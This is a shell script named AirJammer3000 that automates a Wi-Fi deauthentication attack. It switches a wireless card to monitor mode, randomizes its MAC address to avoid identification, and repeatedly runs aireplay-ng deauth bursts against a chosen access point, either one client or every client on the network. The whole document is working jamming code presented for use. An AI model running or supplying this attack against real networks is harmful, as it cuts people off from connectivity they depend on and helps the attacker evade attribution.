#!/bin/sh

# AirJammer3000: airodump-ng deauth attack with automated MAC shifting, single target or full network;
# insert AP MAC, channel #, and target MAC [optional]

# color codes
red="\e[0;91m"
blue="\e[0;94m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
uline="\e[4m"
yellow="\e[1;33m"
purple="\e[0;35m"
cyan="\e[0;36m"
reset="\e[0m"

# FUNCTION: start aireplay
flag=0
function air_jammer () {
	printf "${blue}|#  Starting attack... [Ctrl+C to stop]\n"
		while [ $flag -lt 17 ]
			do
				printf "${purple}|#	deauth in progress...\n${blue}"
				if [ ${client} != '0' ]
				then	aireplay-ng -0 5 -a $bssid -c $client $iface
				else 	aireplay-ng -0 5 -a $bssid $iface
				fi
				#printf "${purple}|#	randomizing MAC...\n${white}"
				#ifconfig $iface down
				#macchanger -r $iface | grep New
				#ifconfig $iface up
				iwconfig $iface | grep Mode
				printf "${purple}|#	waiting...\n"
				sleep $sleep
				printf "|#	restarting...\n${reset}"
				let flag=$flag+$flag
			done
			if [ $flag -ne 0 ]
				then trap_ctrlc
			fi
}
# FUNCTION: stop + clean-up [Ctrl+C]
function trap_ctrlc () {
	# perform cleanup here
	printf "${yellow}\n"
	printf "|#${red}${bold}  AirJammer shutting down...\n${reset}"
	printf "${purple}|#	current state:\n${white}"
	iwconfig $iface | grep Mode
	macchanger -s $iface | grep Current
	printf "${purple}|#\n${cyan}"
	read -p "|#  >>Do you want to give it another shot? [y/n] " sn
		case $sn in
			[Yy]* ) printf "${purple}|#		okay. restarting AirJammer...${yellow}[5 shots per cycle]\n"; flag=1; air_jammer;;
			[Nn]* ) printf "${purple}|#		...attack has ended.\n${blue}|#\n${cyan}"
		esac
	read -p "|#	 >>Do you want to set a new MAC? [y/n] " ny
		case $ny in
			[Yy]* ) printf "${purple}|#	ok. setting random mac...\n${white}"; ifconfig $iface down; macchanger -r $iface | grep -v 'Permanent'; ifconfig $iface up; printf "${blue}|#\n${cyan}";;
			[Nn]* ) printf "${purple}|#	ok. keeping MAC...\n${reset}"; printf "${blue}|#\n${cyan}";;
		esac
	read -p "|#	>>Do you want to reset managed mode? [y/n] " yn
		case $yn in
			[Yy]* ) printf "${purple}|#	ok. setting managed mode...\n${white}"; ifconfig $iface down; iwconfig $iface mode managed; ifconfig $iface up; iwconfig $iface | grep 'Mode';;
			[Nn]* ) printf "${purple}|#	ok. keeping current mode...\n${white}"; iwconfig $iface | grep 'Mode';;
		esac
	printf "${blue}|#  Done.\n${reset}"
	# exit w/ error code: 2; if omitted, shell script will continue execution
	exit 2
}
# initialise trap to call trap_ctrlc function
# when signal 2 (SIGINT) is received
trap "trap_ctrlc" 2

# main script:
# setting up environment
printf "${yellow}"
printf "|#${blue}${bold}  AirJammer3000 starting up...\n${reset}"
printf "${purple}|#\n${reset}"
printf "|#  available wireless interfaces:\n"
printf "|#---------------------------------------\n"
iw dev | grep Interface | awk -F ' ' '{print$2}'
printf "|#---------------------------------------\n"
read -p "|#     >> what wireless interface do you wish to use? " iface 
read -p "|#     >> press enter to begin setup... "
printf "${purple}|#	setting up wireless card...\n${white}"
ifconfig $iface down
macchanger -r $iface | grep -v 'Permanent'
iwconfig $iface mode monitor
ifconfig $iface up
printf "${purple}|#	checking $iface mode...\n${white}"
iwconfig $iface | grep Mode

# variables declaration
printf "${purple}|#\n${cyan}"
read -p "|#		>>Insert BSSID to jam: " bssid
read -p "|#		>>Insert channel [put 0 to keep default]: " chan
        if [ ${chan} -ne 0 ]
        then
                printf "${purple}|#      setting channel ${chan}...\n|#		${reset}"
		iwconfig $iface channel ${chan}
		sleep 1
		iw $iface info | grep channel
        else
                printf "${purple}|#      channel remains the same...\n${cyan}"
        fi
printf "${cyan}"
read -p "|#	>>Insert specific client's MAC [0 for global attack]: " client
read -p "|#	>>Insert waiting time between deauth tries: " sleep
# start process
read -p "|#     >>Press enter to start..."
air_jammer
